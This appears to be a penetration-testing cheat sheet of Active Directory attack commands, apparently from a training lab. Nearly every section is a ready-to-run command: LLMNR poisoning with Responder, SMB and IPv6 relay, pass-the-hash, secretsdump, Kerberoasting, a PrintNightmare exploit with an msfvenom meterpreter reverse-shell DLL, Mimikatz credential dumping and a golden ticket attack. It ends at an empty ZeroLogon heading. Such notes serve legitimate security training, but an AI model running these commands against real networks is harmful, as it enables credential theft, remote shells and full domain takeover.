# Attacking Active Directory

## Intitial Access Vectors

### Responder

```
responder -I eth0 -rdwv
```

### Discover SMB Signing disabled

```
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
```

### SMB Relay Attack


```
sudo ./ntlmrelayx.py -tf /home/kali/pnpt/targets.txt -smb2support
```

```
sudo ./ntlmrelayx.py -tf /home/kali/pnpt/targets.txt -smb2support -i
```

```
sudo ./ntlmrelayx.py -tf /home/kali/pnpt/targets.txt -smb2support -c "whoami"
```

### Iv6 DNS Takeover via mitm6

```
mitm6 -d joker.local
```

```
ntlmrelayx.py -6 -t ldaps://<domain-controller-ip> -wh fake fakewpad.joker.local -l lootme
```

## Post-Compromise Enumeration

### Powerview

Load up PowerView
```
powershell -ep bypass 
.\PowerView.ps1
```

Get information about the Domain
```
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
(Get-DomainPolicy)."system access"
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select samaccountname
Get-NetUser | select description
Get-UserProperty
Get-UserProperty - Properties pwdlastset
Get-UserProperty - Properties logoncount
Get-UserProperty - Properties badpwdcount
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -FullData | select OperatingSystem
Get-NetGroup
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroup -GroupName "admins"
Get-NetGroupMember -GroupName "Domain Admins"
Invoke-ShareFinder
Get-NetGPO
Get-NetGPO | select dsiplayname, whenchanged
```

### BloodHound

Install BloodHound
```
apt install bloodhound
```

Set up neo4j
```
neo4j console
```

Load up SharpHound
```
powershell -ep bypass 
.\SharpHound.ps1
```

Invoke-BloodHound
```
Invoke-BloodHound -CollectionMethod All -Domain JOKER.local -ZipFileName file.zip
```

## Post-Compromise Attacks

### CrackMapExec

Pass the Password Attack
```
crackmapexec smb 192.168.0.0/24 -u jtodd -d JOKER.local -p Password1
```
```
crackmapexec smb 192.168.0.0/24 -u jtodd -d JOKER.local -p Password1 --sam
```

Pass the Hash
```
crackmapexec smb 192.168.0.0/24 -u "Jason Todd" -H <hash> --local
```

### PsExec

```
psexec.py joker/jtodd:Password1@192.168.12.5
```
```
psexec.py "jason todd":@192.168.12.5 -hashes <LM/NT hash>
```

### SecretsDump

```
secretsdump.py joker/jtodd:Password1@192.168.12.5
```

### Hashcat

Cracking NTLM Hashes
```
hashcat64.exe -m 1000 hashes.txt rockyou.txt -O
```

### Token Impersonation

Using Metasploit, once you get a meterpreter session, load incognito
```
load  incognito
list_tokens -u
impersonate_token marvel\\administrator
```

### Kerberoasting

Impackets GetUserSPNs
```
GetUserSPNs.py  marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
```

Using Hashcat
```
hashcat --help | grep Kerberos
```

Using Hashcat
```
hascat64.exe -m 13100 hashes.txt rockyou.txt -O
```

### GPP (Group Policy Preferences) aka MS14-025  / cPassword Attacks

Look for Groups.xml file
```
gpp-decrypt <cPassword>
```

### URL File Attacks

Save file to a share - "@whatever.url" - point to attacker IP
```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```

Load responder to capture hashes when someone access the share
```
responder -I eth0 -v
```

### PrintNightmare

Use rpcdump.py from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable
```
rpcdump.py @<DC IP> | egrep 'MS-RPRN|MS-PAR'
```

Install latest version of Impacket

msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=4444 -f dll > shell.dll
```

msfconsole
```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT
set LHOST
run
```

Set up File Share
```
smbserver.py share 'pwd' -smb2support
```

Exploit
```
python3 CVE-2021-1675.py marvel.local/fcastle:Password1@<Domain Controller IP> '\\<File Share IP>\share\shell.dll'
```

### Mimikatz Credential Dumping

Download Mimikatz the Domain Controller

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch
ntds.dit
```

### Golden Ticket Attack

```
mimikatz.exe
privilege::debug
lsadump /inject /name:krbtgt
```

Open Notepad, need the SID of the domain and NTLM hash of the Kerberos TGT account.

```
kerberos::golden /User:Administrator(anything) /domain:marvel.local /sid:<SID of Domain> /krbtgt:<NTLM Hash> /id:500 /ptt
```

```
msc::cmd
```

```
dir \\THEPUNISHER\c$
```

To get a shell
```
psexec.exe \\THEPUNISHER cmd.exe
```

## ZeroLogon
